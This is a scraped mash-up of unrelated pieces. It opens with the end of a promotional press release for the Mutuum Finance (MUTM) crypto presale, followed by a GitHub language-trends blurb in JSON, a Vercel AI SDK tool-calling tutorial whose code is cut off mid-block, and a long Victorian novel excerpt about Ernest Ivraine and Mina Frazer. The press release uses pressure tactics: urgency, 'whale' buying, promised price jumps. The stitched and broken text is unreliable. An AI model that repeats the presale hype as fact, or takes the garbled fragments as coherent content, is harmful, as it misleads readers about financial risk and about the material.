testnet. This is a big deal because it shows the tech is real. People can now test the \"mtTokens\" and the \"Health Factor\" tools in a safe way.&nbsp;</p><p>To make sure everything is perfect, the code was checked by Halborn Security. They are world-class experts who look for any weak spots in the code. This manual audit proves that Mutuum Finance is a professional-grade platform.</p><h2>Success in Numbers: Growth and Investors</h2><p>The project has reached an incredible milestone by raising over $20.6 million. This is a huge achievement in the current market. But the money is only half of the story. More than 19,000 individual investors have joined the ecosystem. Having a large and diverse group of holders is very important. It means the project is not controlled by just a few people. It shows that thousands of people believe in the long-term vision of a decentralized credit market.</p><p>The growth in value has also been very steady. When the journey first began, the initial token price was just $0.01. Today, the price is $0.04. This is a 300% increase from the very start.&nbsp;</p><p>For early supporters, this means the project has already proven its strength. A 300% rise shows that as the team reaches technical goals, the market rewards that progress. It signals that the project is moving in the right direction even while other coins are going down.</p><h2>Token Distribution and Daily Activity</h2><p>The total supply of MUTM tokens is fixed at 4 billion. Out of this total, 45.5% is set aside for the early stages. This means 1.82 billion tokens are available for the community. Why is this important? It ensures that almost half of the project is owned by the people who use it. So far, over 850 million tokens have already been claimed. This means the supply is dropping fast every single day.</p><p>To keep the community active, the project uses a 24-hour leaderboard. This tracks who is the most active each day. The top person wins a $500 reward in tokens. This daily competition makes sure people stay engaged with the platform.&nbsp;</p><p>It also helps new people join easily. You do not need to be a crypto pro to get involved. The platform has card payment options. You can use a regular debit or credit card to secure your position. This removes the hard steps that usually stop people from using new technology.</p><p>We are currently in Phase 7, and it is selling out very quickly. The urgency is being driven by \"whales.\" These are very large investors who move big amounts of money. Recently, one whale made a massive $100,000 allocation in a single transaction. When big players move like this, it is a signal to everyone else. It means the experts see a major opportunity before the next price jump.</p><p>The current price of $0.04 is the last stop before the next hike. The official launch price is already confirmed at $0.06. This means the window to get in early is closing. Phase 7 is the final chance to join at this specific rate before the project moves closer to its mainnet debut.&nbsp;</p><p>The smart money is not waiting for the launch. They are securing their spots now while the supply is still available. Entering during Phase 7 means joining a project that has the funding, the tech, and the community to lead the future of finance.</p><p>For more information about Mutuum Finance (MUTM) visit the links below:</p><p>:::tip\nThis story was published as a press release by Btcwire under HackerNoon’s Business Blogging&nbsp;</p><p>\\\nThis article is for informational purposes only and does not constitute investment advice.

      "content": "\"In August 2025, TypeScript surpassed both Python and JavaScript to become the most-used language on GitHub for the first time ever...\" writes GitHub's senior developer advocate. \n\nThey point to this as proof that \"AI isn't just speeding up coding. It's reshaping which languages, frameworks, and tools developers choose in the first place.\"\n\nEighty percent of new developers on GitHub use Copilot within their first week. Those early exposures reset the baseline for what \"easy\" means. When AI handles boilerplate and error-prone syntax, the penalty for choosing powerful but complex languages disappears. Developers stop avoiding tools with high overhead and start picking based on utility instead. \n\nThe language adoption data shows this behavioral shift: \n — TypeScript grew 66% year-over-year \n — JavaScript grew 24% \n — Shell scripting usage in AI-generated projects jumped 206% \nThat last one matters. We didn't suddenly love Bash. AI absorbed the friction that made shell scripting painful. So now we use the right tool for the job without the usual cost. \n\"When a task or process goes smoothly, your brain remembers,\" they point out. \"Convenience captures attention. Reduced friction becomes a preference — and preferences at scale can shift ecosystems.\"\n\n\n\n\"AI performs better with strongly typed languages. Strongly typed languages give AI much clearer constraints...\"\n\"Standardize before you scale. Document patterns. Publish template repositories. Make your architectural decisions explicit. AI tools will mirror whatever structures they see.\"\n\"Test AI-generated code harder, not less.\"\n",

      "content": "<p>Remember that moment you watched an AI generate text token-by-token? It felt like magic. You could see the thought process unfold, the sentences building in real-time. It was a huge leap from the static, wait-for-the-whole-message experience.</p><p>But let’s be honest — it was also a bit like watching someone  use a computer. The AI was a brilliant storyteller, but it was stuck in a box. It could tell you how to book a flight, but it couldn’t click the “Book Now” button. It could describe your recent orders, but it couldn’t fetch the list from your database.</p><p>This is the fundamental limitation of a pure Large Language Model: it has no hands.</p><p>The  render pattern is the solution. It’s the architectural pattern that gives AI its hands, transforming it from a passive text generator into an active, collaborative partner that can execute real-world tasks.</p><p>This guide will break down this powerful pattern, from the core ReAct framework to a production-ready code example you can use today.</p><h3>From Spectator to Collaborator: The Core&nbsp;Concept</h3><p>In streaming UI the server sends a continuous flow of tokens, and the client consumes them. It’s a one-way street: Server → Client. The client is a spectator.</p><p>The  pattern flips this model into a collaborative loop. It’s no longer just about displaying text; it's about executing functions and rendering the results as structured, interactive components.</p><ul><li>Streaming: You’re reading a recipe line-by-line as it’s being written. You’re a spectator.</li><li>Tool-Call: You’re the head chef. You tell your sous-chef (the AI), “I need a list of nearby restaurants.” Instead of describing the process, the sous-chef goes to the kitchen (the server), executes the function to fetch the list, and brings the prepared ingredients (the data) back to you, ready for the next step.</li></ul><p>The UI becomes a dynamic dashboard of the AI’s actions, not just a chat log.</p><h3>The “Why”: Bridging Language and&nbsp;Code.</h3><p>The magic behind this pattern is Function Calling. This is the standardized protocol that allows an LLM to bridge the gap between its probabilistic world of language and the deterministic world of code.</p><p>When an LLM receives a request like “What’s the weather in London?”, it doesn’t just hallucinate an answer. It recognizes it needs an external tool. It then:</p><ol><li>Plans: Reasons which tool to use ().</li><li>Acts: Constructs a structured request (e.g., ).</li><li>Observes: Receives the result from your server-side function.</li></ol><p>This transforms the LLM from a conversational partner into a planner and a coordinator. Think of it as a Client-Side Router for AI:</p><ul><li>The LLM is the router, analyzing the user’s intent.</li><li>The Tools are your API endpoints, providing the data.</li><li>The UI is the view, rendering the result.</li></ul><p>This is how we build genuinely functional systems. The AI becomes the logic layer that connects user intent to server-side execution.</p><h3>The Engine Under the Hood: ReAct and the T-A-O&nbsp;Loop</h3><p>The  pattern is a practical implementation of the ReAct (Reasoning and Acting) framework. It operates on a simple but powerful feedback loop:</p><ol><li>Thought: The AI’s internal monologue. It analyzes the prompt, its available tools, and the conversation history. It asks, “What needs to happen next?”</li><li>Action: The AI decides to use a tool. It generates a structured output (a JSON object) specifying the function name and parameters. Control is handed off to your server.</li><li>Observation: Your server executes the function and returns the result. This result is fed back into the AI’s context as an “Observation.”</li></ol><p>This cycle repeats until the request is fulfilled. The AI thinks, acts, observes, and thinks again.</p><p>The Blueprint: Your Tool’s API Contract</p><p>Before the AI can act, it needs to know what actions are possible. This is defined in a Function Calling Schema — a machine-readable contract that acts as your tool’s API documentation.</p><p>A typical schema includes:</p><ul><li>: The unique identifier (e.g., ).</li><li>: A clear explanation the AI uses to decide which tool is appropriate. Good descriptions are critical.</li><li>: A JSON Schema defining the expected inputs (types, required fields, descriptions).</li></ul><p>Here’s a schema for a user profile lookup tool:</p><pre><code>const userProfileTool = {\n  name: \"get_user_profile\",\n  description: \"Retrieves the public profile information for a specific user.\",\n  parameters: {\n    type: \"object\",\n    properties: {\n      username: {\n        type: \"string\",\n        description: \"The unique username of the user to look up.\",\n      },\n    },\n    required: [\"username\"],\n  },\n};\n</code></pre><p>When the AI sees a prompt like “What is the profile for user ‘alice123’?”, it consults this schema, identifies the correct tool, and generates the  step.</p><h3>The Render Pattern: Making Execution Visible</h3><p>This is where the  pattern truly shines. It’s not enough to execute the function and return the result at the end. The pattern dictates that the state of the tool's execution must be streamed and rendered in the UI in real-time.</p><p>This creates a transparent, trustworthy user experience. The UI breaks down into distinct states:</p><ol><li>Initiation: The AI decides to call a tool. The UI immediately renders a placeholder — a loading spinner or a message like “Checking the database…”.</li><li>Execution: While the server-side function runs, the streaming connection keeps the UI element active.</li><li>Completion (Success): The loading state is replaced by the actual content, rendered as a distinct component (e.g., a user profile card).</li><li>Error Handling: If the function fails, the error is streamed back and rendered as an alert box.</li></ol><p>The user doesn’t just see an answer; they see the  of how that answer was derived.</p><h3>The Ultimate Power: Chaining Multi-Step Workflows</h3><p>The true power emerges when you chain multiple tool calls. The  from one tool becomes the context for the next , leading to a new .</p><p>Consider this complex request: <em>“Find all open pull requests for ‘vercel/ai’ and summarize the latest comment on each.”</em></p><p>A single tool can’t do this. The  pattern enables a sequence:</p><ol><li>Action 1: Call  for 'vercel/ai'.</li><li>Observation 1: Get a list of PRs (e.g., #123, #124).</li><li>Thought 2: The AI now knows the PRs exist and decides to fetch comments for each.</li><li>Action 2: Call  for PR #123. The UI streams a loading state for this specific PR.</li><li>Observation 2: Get the comments. The UI updates with the summary.</li><li>Action 3: Call  for PR #124. The UI updates again.</li><li>Final Thought: The AI synthesizes all observations into a final summary.</li></ol><p>By chaining tools, we can build sophisticated, multi-step workflows that feel like a seamless conversation.</p><p>Let’s build a practical example using Next.js and the Vercel AI SDK. We’ll create a simple SaaS feature where an AI assistant fetches the current weather. The UI will stream the tool’s execution state in real-time.</p><p>This example uses an Edge-First Deployment Strategy for low latency and Strict Type Discipline with Zod to prevent runtime errors.</p><h4>Server-Side API Route ()</h4><pre><code>import { streamText, ToolExecutionUnion } from 'ai';\nimport { z } from 'zod';\nimport { openai } from '@ai-sdk/openai';\n\n// Define the tool.

If the LLM tries to call this tool with a number or a missing  field, the SDK rejects it before it ever reaches our  function. This is your runtime safety net.</li><li><code>execute: async ({ city }) =&gt; {&amp;nbsp;... }</code>: This function runs only on the server when the LLM invokes the tool. It executes in the Edge Runtime, minimizing latency. The return value is automatically serialized and streamed back to the client.</li><li>: This is the magic property injected by the Vercel AI SDK. It allows us to conditionally render tool-specific UI instead of just raw text.</li><li>: This state appears the instant the LLM requests the tool. We render a \"Executing…\" indicator here for immediate feedback.</li><li>: This state appears once the server-side  function completes. We render the final data here.</li></ul><ol><li>Vercel Edge Timeouts: The Edge Runtime has short timeouts (10–30s). Keep your  functions lightweight. For heavy tasks, offload them to background jobs and return a \"job ID\" instead of blocking the stream.</li><li>Async/Await Loops in : Don't run multiple tool calls sequentially inside a single  function. This blocks the stream. Let the LLM's ReAct loop handle the sequence naturally.</li><li>Hallucinated JSON: Even with Zod, the LLM might generate malformed arguments. Zod’s&nbsp; methods can help validate logic before execution.</li><li>Missing : In Next.js App Router, any component using  must be marked with . The API route remains a Server Component.</li></ol><p>The  render pattern is more than a technical implementation detail; it's a fundamental shift in how we design AI applications. By making the AI's reasoning and execution process visible and interactive, we move beyond simple Q&amp;A and into the realm of true, collaborative problem-solving.</p><p>We’re no longer just building chatbots. We’re building AI agents that can think, plan, and act, with a UI that faithfully renders every step of their journey. This is the future of functional, AI-powered software.</p><p>The concepts and code demonstrated here are drawn directly from the comprehensive roadmap laid out in the book “The Modern Stack. Building Generative UI with Next.js, Vercel AI SDK, and React Server Components”</p>",

Was the prolongation of existence, then, a boon for which he ought to thank them?</p><p>Ernest smiled bitterly as he opened the drawing-room door and entered the apartment, which, being tenantless, he felt he was at perfect liberty to make himself thoroughly comfortable in, and, accordingly, he took possession of one of the ancient sofas Mrs. Frazer had got “done up” in damask, and modernized, soon after her arrival in Belerma Square, and stretching his weary person at full length upon it, he began musing&nbsp;&nbsp;on the events of the last three weeks.</p><p>They might not be many, but they were important: first, there was he, Ernest Ivraine, who for years previously had never known any ailment,—save&nbsp;268that common one, the heartache,—a languid listless invalid, who found it a trouble to raise even his uninjured arm to his head, which would, in spite of his own inclinations and Dr. Richard’s unremitting exertions, keep everlastingly tormenting him with harbouring a dull, ceaseless, throbbing sort of pain, which unfitted him for the slightest labour of any kind, and made him feel moping and indolent, in spite of various efforts to rouse himself and try to be, as he occasionally said to Malcolm Frazer, “a man again.”</p><p>Then, in the next place, he, the eldest son of a miserly Lincolnshire baronet, had formed a sort of friendship for a wild careless boy, who introduced himself as the descendant of a perfect swarm of old Highlanders, with all sorts of heathenish and unpronounceable Christian names, which Highlanders, it seemed, from Malcolm’s account, had been great in the land before Ben Nevis was heard of; and he knew, by something more conclusive than the young Scotchman’s vague ancestral assertions, that he was a guest in the house of Malcolm’s English uncle, who resided in a very unfashionable gloomy part of London, who was a merchant, reported to be immensely rich, and whom he had not yet seen, in consequence of his protracted absence upon important&nbsp;269business in the flat, rich, marshy land of Holland.</p><p>And if the “events” had finished here, none of them need ever have been chronicled, for broken arms will knit, and broken heads will mend, and strength will return, and the pulse, after a temporary weakness, will throb rapidly as it was wont to do; and the friendship he felt for Malcolm was neither so deep nor so intense as to make the prospect of a speedy parting appear perfectly unendurable to him; and he felt he could say farewell to Mrs. Frazer and Miss Caldera without a faltering tone; and as to the house itself, why it was a vast deal more comfortable than Paradise, the furniture and appointments being twice as good, and the style of living and so forth infinitely better: but then he did not expect the owner of it to leave him anything, and he fully anticipated the inhabitants of his father’s abode would bequeath sufficient to render him and Henry independent for ever of the smiles or frowns of fortune. But Ernest Ivraine knew something more had happened during the course of those three weeks than illness of body, the making of friends, or the growth of the, to him, hitherto unexperienced sensation that ties half the world together one day in bonds which, alas! for human&nbsp;270nature, snap asunder too frequently the next—gratitude.</p><p>The melancholy man closed his weary eyelids and sunk hopelessly back as he reluctantly admitted the miserable truth that he had commenced to care for something besides Henry, his brother; that he had made but one rapid stride from freedom of heart to sorrow of soul; that a new care, a fresh trial had been created for him by the pale slight girl, who had nursed and watched him like a sister during his illness, and scarcely spoken ten words to him during his convalescence; who, least of all in the house, obtruded herself on his notice or sought to drag him out from the armour of silent reserve, in which, for years, it had been his pleasure habitually to encase himself; who seemed pining to be away from that dreary Square, just as Henry had pined to leave Paradise; and who, if not handsome, or striking, or fascinating, had a mild beautiful pair of eyes that might have pleased any one, and a look of sad, earnest thought in her face, which interested the baronet’s son more than the gayest, brightest expression of a happy woman could have done. For though a glad kind glance might, for a moment, have won an answering smile from Ernest, still the smile would have faded from his lips the next, leaving&nbsp;271no more trace behind in his soul than that left by a chance sunbeam on the surface of some darksome river, whilst the look that dwelt almost continually in Mina’s face had become part of his thoughts, and having, by some means, found an entrance, it remained in his heart, for nothing that once took silent possession of that gloomy citadel, whether good or evil, pleasant or disagreeable, could ever afterwards be completely eradicated therefrom.</p><p>His feelings, affections, hates, grew to be as much portions of himself as the blood in his veins, which had been half stagnated during his long residence at Paradise. Though he was so weak and ill, it seemed to Ernest, at times, as if the stream of life circulated more freely through his frame in the more wholesome London atmosphere than it had been wont to do amongst the swamps of “home;” and even whilst he mourned over it, he could not conceal from himself the fact that a better feeling than love of gold, or the craving, sickening desire for a father’s death, had got possession of him,—love, yea, verily love, for Mina Frazer.</p><p>Ernest Ivraine felt himself constrained to care for her, and though he told his rebellious heart that she was not and could never be anything to him, still his heart declined to believe the assertion. Wherefore,&nbsp;272Mina, all unconsciously, retained her place there, and the baronet’s son mourned because of the fresh trouble that had fallen upon him.</p><p>“Your sister does not seem very strong,” he had remarked one day to Malcolm; and the answer which was returned to this observation pained him more than he would have cared to acknowledge.</p><p>“No,” said Malcolm, who always liked to speak of his “clan,” “she pines and sickens for home and a sight of our relatives there. The English air has never suited her nor never will; her body is here and her heart there: but whenever my uncle returns, I intend to go myself and take her to the Highlands.”</p><p>“Not to remain for a permanency, though?” exclaimed Ernest hastily; then added more quietly, “Mrs. Frazer could scarcely do without her.”</p><p>“And me,” supplied the youth, pulling up his shirt collar with a self-satisfied air, which proved to Ernest he knew he should be the most missed. “Oh, no! not for a permanency, at least, not at present; when I am older and have seen a little more of the world and feel tired of excitement and that sort of thing, I shall probably settle there, buy an estate (where I hope you’ll come and shoot), and be, like my uncle, a small sovereign in some remote Highland&nbsp;273principality; but just now, you see, I am rather in the ‘black books’ here, and want to be out of sight of St. Paul’s till the fog clears away. And Mina, poor child! I have not yet told her of my intention, but she will be wild with delight at the prospect of seeing Craigmaver once more. She was quite young when she left it; but it has been what novelists call ‘an enduring thought’ with her ever since.”</p><p>What could he, the silent, melancholy, Lincolnshire misanthrope ever be to Mina Frazer, the rich city merchant’s niece, with her Highland partialities and prejudices, her old strong attachments, her unconquerable dislike to her mother’s country, her wild yearning for the hills and the moors and the mountains of her beautiful fatherland! What had he, whose eyes were weary with gazing over fens and swamps and flat low fields, to do with one who had in childhood looked on the bold scenery of her birthplace till she had come to claim affinity with it, and to feel that it was a sort of living death to dwell far from rushing waterfalls and spreading lakes and rocks and caves and glens! Why should he, whose relatives were so sordid and mean and calculating, even think of her who had spent the most impressionable part of life amongst those whose hearts were&nbsp;274pure and fresh and free as the wind that wandered over the heath-clad hills! He was nothing—could be nothing to her, Ernest Ivraine constantly reflected; and yet, with a sort of soul sickness, he found day by day that she was growing to be much to him.</p><p>Too much—a being to remember, to carry a sad memory back to Paradise, to dream of in after days, to long to see, to marvel concerning. She would return to the Highlands with Malcolm, ay, and stay there, probably, and lose the melancholy expression which had first attracted him to her: in time she would marry, perhaps, and be mistress of some lovely Scottish home, whilst he remained for ever moping and pining amid the dreary swamps surrounding the ancient gloomy brick pile he had called, since infancy, “home.”</p><p>“I ought to go,” Ernest murmured, half aloud, as the whole truth dawned upon him; and he raised himself on one elbow and looked hopelessly at the window, as if beyond it lay freedom from care, as though through it he proposed making his final exit,—“I ought to go.”</p><p>Perhaps, indeed, for one moment he actually thought of doing so, but exhausted nature laid a detaining hand upon him, obscured his eyes with a&nbsp;275sort of semi-darkness, and once again Ernest sunk back on the sofa, feeling that something stronger than his will—stern necessity, to wit—kept him a not reluctant captive in that house.</p><p>Then, when the temporary excitement had passed away, and the sort of calm that great weakness always induces had succeeded thereto, the invalid became conscious that there were persons in the adjoining apartment speaking eagerly and hurriedly together.</p><p>There were only folding doors separating Ernest from them—folding doors but imperfectly shut—and the last few sentences of the conversation being uttered in rather a high key, its purport flashed instantly across his mind. He was no eavesdropper, was too honourable to wish to hear what was not intended to reach his ears; but almost ere he had time to comprehend the interview was a private one, it had concluded and the talkers stood beside him.</p><p>“I gave you a decided answer once before,” was the first hurried sentence he heard, “and I wish you clearly to understand that my present is a final one.”</p><p>“So be it,” answered Mr. Westwood bitterly; “believe me, I should be glad to help you to a grander or a better match.”</p><p>276“You are too kind,” said Mina, with something wonderfully resembling a sneer; and, pushing open the doors as she uttered these words in an irritated tone, she beheld Mr. Ivraine, who had, perhaps, never during the whole course of his life felt himself placed in such an unpleasant position before.</p><p>“I hope you feel better, sir,” said Mr. Westwood, who, having noticed Mina’s sudden start as she crossed the threshold of the two rooms, had followed her in, and now stood the only apparently unembarrassed person present. “I hope you feel better.”</p><p>“A great deal, thank you,” answered Ernest, a very poor apology for a smile flickering over his grave face; “still a little weak, but I shall get over that in a day or two.”</p><p>“Hope to see you quite well again in a short time,” said Mr. Merapie’s partner, with quite an air of interest; “but you have been most dangerously ill, and these things are not to be shaken off all at once. I suppose I can do nothing for you in the city. Oh! Mina, I quite forgot what I came in especially to say to Mrs. Frazer, but will you be kind enough to tell her I had a letter from your uncle this morning, and he expects to be home to-morrow or the day after.”</p><p>277“Confound your impudence,” thought Ernest, a sort of tingling sensation pervading the fingers of even his right hand, as the above sentence smote on his ear; whilst Mina, looking angrily into Mr. Westwood’s face, answered briefly “I will;” and, apparently, not in the least ruffled or disconcerted by what had occurred, the&nbsp;&nbsp;clerk bowed to the invalid, and hastened off to the office of “Merapie and Westwood,” vowing all sorts of vengeance against his insensible “ladye love,” and wishing, for no very good reason, excepting, perhaps, because he was thoroughly out of temper, that “that dark proud Lincolnshire squire had been ‘finished’ instead of cured by gruff little Dr. Richards,” who declared the baronet’s son had a constitution like a lion, which would stand the wear and tear of a thousand years; a declaration Ernest had almost groaned over, as he reflected that it was from his father’s side of the house he inherited “this incapability of being killed.”</p><p>There was an awkward pause for a moment after Mr. Westwood left the room, during which Mina looked at the carpet, and the invalid at her; but before he had time to recover sufficiently from his embarrassment to frame a sentence, or utter a single commonplace observation, the post brought relief&nbsp;278to both, in the shape of an imposing looking packet directed to Ernest Ivraine, Esq., and bearing unmistakeable signs indicating that it had travelled far over the sea, over the land through many countries, from India to the former home of its writer, England.</p><p>“I will leave you to read it,” said Mina, noticing how eagerly he clutched the missive; and thankful to get away, even for a few minutes, she hurried out of the apartment, and proceeded more slowly to her mother’s chamber, to inform the much enduring lady that their visitor was at length able to come upstairs, and had actually accomplished the bold undertaking.</p><p>“Well, my dear, I shall be down to see him directly,” said Mrs. Frazer, coughing in a genteel manner, which clearly proved she was suffering from influenza. “What in the world, child, makes you look so pale?” she added, gazing languidly at Mina from beneath the lace borders of a most ladylike and becoming morning cap; “I never was pale at your age; I’m sure I am not so even now;” and the widow glanced complacently at the mirror, as was her wont whenever she had a convenient opportunity of admiring herself, whilst Mina answered,</p><p>“I am always pale, you know, mamma, and besides, I do not feel well, which I suppose makes me&nbsp;279be paler than usual; I have not been strong for a good while past.”</p><p>It was about the first time in her life the girl had ever complained of bodily illness, and, perhaps, it was this fact which induced her mother to gaze at her for a moment ere she responded,</p><p>“Ill! yes, that’s just what Malcolm was saying this morning, and he wants me to let you go to Craigmaver with him for a little, when I am better, and your uncle returns; but I really do not see how you can leave me.”</p><p>Mina stretched out both hands imploringly to her mother, as she cried,</p><p>“To Craigmaver! oh! let me go, do, pray let me. The air of the Highlands will give me new life; I feel almost as if I should die of excess of joy to see that place once more. I am sure Malcolm would not like to be there without me; won’t you let me go with him.”</p><p>“What a strange unaccountable being you are, Mina,” said her mother, with a puzzled and but ill-satisfied air; “I cannot conceive why you should like that horrid place, miles and miles from a town, where there is nothing to see or hear or buy, and nobody to speak to. It is not natural at your age: I do not understand you, I confess.”</p><p>280“Nothing to see!” echoed Mina, and then the long pent-up loves and longings of her soul burst forth, and fell on the ear of one who could not understand her, and who had never done so. “Nothing to see! oh! mother, think of this, and then of that; think of the hills and the heather and the pines and the free pure air; think of the garden at Craigmaver, filled with flowers and birds and perfumes, where, even in winter, the sun seemed always shining; think of the view down into the silent dark little lake, and of the valleys beyond, and the mountains rising above, peak upon peak, till, in the distance, they seemed to meet the sky, and become lost in heaven; think of the moors where the bees swarmed in myriads; where the scent of wild thyme filled the air, and the eye grew almost tired of the gorgeousness of the purple carpet; where for miles and miles there was no human habitation, no road, scarcely a path, but over which one never got weary of roaming. Nothing to hear! when I was a child, papa and I used to sit down on some old grey stone and listen for hours to the chirping of the grasshoppers and the scream of the eagle, and the dashing of distant waterfalls and the murmuring of nearer streams. Oh! the land that he loved, where he is buried, is dearer to me than any other could ever&nbsp;281become; and when, besides all this, I think of seeing my kind old uncle, and Allan and Saunders and all the people who knew my father as a boy, and love his children for the sake of the dead,—I feel as if my heart would break with joy—as if I should never live to meet them all again.”</p><p>A colour had come up into the usually pallid cheek during the progress of this rapid sentence, and the dark eyes were moistened with tears when Mina concluded.</p><p>“You are just your father over again, child,” said Mrs. Frazer, and the widow sighed deeply as she made this announcement, evidently considering Mina’s likeness to her late husband a dreadful misfortune.</p><p>“But I may go with Malcolm?” persisted Mina, a wild joy and a great fear contending for mastery in her bosom; “may I not, mamma?”</p><p>“I do not know, I cannot say,” answered Mrs. Frazer, vaguely, who possibly might have more speedily acceded to the request had her daughter not been so extremely anxious for it to be granted; “we can see about it when your uncle comes home.”</p><p>“He is to be here to-morrow or the day after,” said Mina.</p><p>282“I’m sure I am thankful to hear it, for the responsibility of being alone in the house with that poor invalid I have felt to be most dreadful; indeed it has been decidedly injurious to my health,” said the widow, who had let her sympathy for Ernest evaporate in words since the first evening her son carried him into the breakfast parlour, until now, when he sate alone in the drawing-room; “and, Mina, you had better go down stairs again and give him my compliments and say how glad I am to hear he is so much stronger, and that I hope to see him presently;” in compliance with which maternal injunction the girl descended the stairs and re-entered the apartment where she had left Mr. Ivraine, and where she now found him, sitting with an open letter in his hand, and an expression of such pain on his face, as caused her almost involuntarily to demand if he were ill.</p><p>He started at her words, and hastily crumpling up the papers, answered “no,” so abruptly, that Mina, fearing she had annoyed him, asked no further question, but, drawing an embroidery frame near to her, commenced working without delivering her mother’s message.</p><p>She could not understand Mr. Ivraine; she had felt very sorry for him, and done all that lay in her&nbsp;283power to soothe his sufferings and restore him to health; and, at first, when weak and almost helpless, he was lying on the sofa in the dining-room, it had seemed as if they were likely to “get on” well enough; but one unhappy day he repelled her most unintentionally, but still most completely, and Mina never recovered a shock of the kind. Thus it came to pass:</p><p>Mrs. Frazer and her daughter were sitting, out of compliment to their guest, in the apartment where John Merapie had been wont to take a comfortable sleep after his dinner and port wine, the widow entertaining the invalid with some of the latest fashionable intelligence, which she thought might prove at once interesting and amusing, when, during one of the lulls in her sensible conversation, Mr. Ivraine turned to Mina, who had sat mute as a statue for fully twenty minutes, and asked if she would be so kind as to write a letter to his father for him.</p><p>“You see,” he added, glancing at his arm, “it is a duty I am unable to perform myself.”</p><p>Most truthfully Mina answered that she would be very glad, and, immediately producing writing materials, she drew a chair and table near to the sofa and sat for a minute or two waiting, with a pen in her hand, ready to write down whatever he might&nbsp;284choose to dictate. But, after a puzzled pause, Ernest, a very curious expression flitting over his countenance as he spoke, said,</p><p>“I believe, Miss Frazer, I shall not trouble you; perhaps your brother would write it for me instead.”</p><p>He never added a single syllable of explanation, and Mina felt hurt and mortified. Why she felt so, she did not exactly know; but the effect produced by the simple sentence was such that, whilst Malcolm and Mrs. Frazer, and even Miss Caldera, grew to like the stranger, and he, in his turn, came to converse freely and easily with them, they two scarcely spoke to each other ten times in the course of the day, for she fancied he was proud and stern; and he, imagining she could care for nothing which was not an importation direct from Scotland, knowing his own position, and feeling, moreover, how dangerously large a portion of his thoughts she occupied, sedulously avoided much association with, and kept away from her, as men of strong minds do keep away from things and people whom, even whilst they long to be near, they dread for their own peace sake becoming very dear to them.</p><p>And so Mina could not understand the silent uncommunicative man, and thinking, therefore, he did not wish to be interrupted in his meditations, she&nbsp;285bent her head over her work, and, as the rapid needle sped on its course, she gave herself up to pleasant imaginings, concerning her visit to the North and meetings and greetings with the never-to-be-forgotten friends who dwelt there.</p><p>Meanwhile, Ernest Ivraine, a blacker and sadder shadow than ever darkening his brow, sat watching her; for the first time in his life, a doubt of the prudence of his choice, years before, occurred to him; for the hundredth time, he felt the galling slavery of his position unendurable: he was sickening for liberty to act as he listed, to speak as his heart prompted him. For the moment he almost desired to cast Paradise and the golden shackles that bound him to it and drew him reluctantly back there, from his soul, and to rush forth hopeful and self-reliant, as Henry had done, into the world.</p><p>For, without his aid, Henry had succeeded; the brave heart and the strong arm had triumphed and brought to their honest manly possessor fame, station, comparative wealth, at last.</p><p>There lay the letter before him, scarcely legible with the glad high words of fulfilled hope, of thankful rejoicing, with inducements to his brother to come and do likewise, with sentences of affection and dreams of still higher fortune; there it lay, and&nbsp;286there also lay the money Henry did not now require to aid him in his ascent, and Ernest gazed alternately at them and Mina.</p><p>It is easier—oh, woe for the soul of man!—easier by far to weep with those who weep than to rejoice with those who rejoice: easier to clasp the hand of a friend in sorrowful sympathy than to wring it in cordial congratulation; for grief is so perpetual a visitor to the hearts of most, that its advent to that of another only seems to draw the chords of attachment closer, and to cause the same mournful melody to vibrate in greater unison, whilst—so contradictory is human nature that a throb of joy, agitating the bosom of one even dearly loved, nineteen times out of twenty causes a sensation of pain to distract, for an instant, the peace of the other.</p><p>Ernest Ivraine had suffered and sorrowed for and with Henry; with all the intensity of his nature he loved his brother; he had longed for him to be great and respected and fortunate; and yet now, when success flung her bright smiles on the path of the younger brother and threw a sort of sunshiny track far away into the future for him, Ernest’s first feeling was regret, not that Henry was happy, but that his own lot was not equally so.</p><p>“Good heavens!” he thought, “what a wretch&nbsp;287dwelling amongst swamps must have made me, when I do not feel my heart bound with triumph to hear Henry is climbing at last, and without my assistance.” And Ernest crumpled up the letter, and strove to put it and the rebellious feeling aside, whilst he talked to her who was the cause of the latter, for she had made him wish and thirst for liberty and success, as he had never previously done for aught save gold.</p><p>“Miss Frazer,” he began, and the strong effort he was making to master his emotions made him seem a little graver and sterner than ever: “Miss Frazer, I believe I soon must leave this house, where I have received so much kindness and——”</p><p>“Oh, no!” interrupted Mina, looking up with a happier look in her face than Ernest had ever seen there before—she had been thinking of sunshine on the Scottish hills, but he did not know that;—“oh, no! Dr. Richards said you were not to attempt to move till you were quite strong again.”</p><p>“But I am much better now, thank God!” said Ernest, “and I feel I cannot intrude any longer. Mr. Merapie——”</p><p>“Will be delighted for you to stay till it is quite safe for you to travel, at any rate,” once more interposed Mina. “We have all regretted not being&nbsp;288able to make you more comfortable,” she added in a slightly hesitating tone; “this place is so dreary and stupid, it is not good for an invalid.”</p><p>Ernest mentally reflected, it was a sort of heaven in comparison with his own home, and sighed as he did so.</p><p>“Then you do not like Belerma Square?” he said, after a moment’s pause.</p><p>“No,” briefly responded Mina; and the “No” was, as Malcolm would have in some cases approved, decided.</p><p>“Nor London?” proceeded Ernest.</p><p>“Nor London,” she acquiesced.</p><p>“Nor England?” he inquired, by way of a finale.</p><p>A sort of perplexed look came over the girl’s face for an instant, but then she frankly replied,</p><p>“It would not be exactly polite for me to say to you that I dislike England, particularly as I know so little of it; I am not very fond of your country, it is true, but I might like it better if I did not love my own so much.”</p><p>“Then you would not desire to pass your life here?”</p><p>“Here! no!” she responded. “I wish my uncle would retire and buy an estate in the Highlands, but he thinks no place is so pleasant as London, and&nbsp;289I could not bear to be always away from him now: that is the worst of removals, one cannot carry every friend one makes away, nor collect every desirable thing together: those are the happiest who live and die and remain always in the one spot.”</p><p>“If they care for that spot,” supplied Ernest.</p><p>“Every one is fond of the place he was born in,” said Mina.</p><p>“Some dislike it for that very reason,” answered Ernest drily; “but,” he added, turning the current of the conversation very abruptly back into the course from whence he himself had diverted it, “I fear your uncle will think my long illness must have completely exhausted your patience, and that my protracted visit has been perfectly unreasonable and unjustifiable.”</p><p>“When you were unable to go away, whether you would or not,” broke forth Malcolm, who had sauntered into the room in time to catch the conclusion of the foregoing sentence. “Ah! you do not know my uncle; he will say bringing you here is the first sensible action he has known me perform for some years past, and he will add, he hopes you will consider this your home until you are well enough to return to a better; and he will ask you if we have taken as good care of you as any one, excepting&nbsp;290your own relatives and himself, could have done; and he will regret his absence from London, feeling quite sure he could have made you twice as comfortable as his scapegrace of a nephew has endeavoured to do; and he will think that, on the whole, I am not so bad as he thought me before his departure for Holland. And Mina and I will set off to the Highlands early in the spring, leaving him as well pleased with us as ever he was; and I shall look out for a fine site for the house I mean to build when I get on into middle life, of which Mina is to be 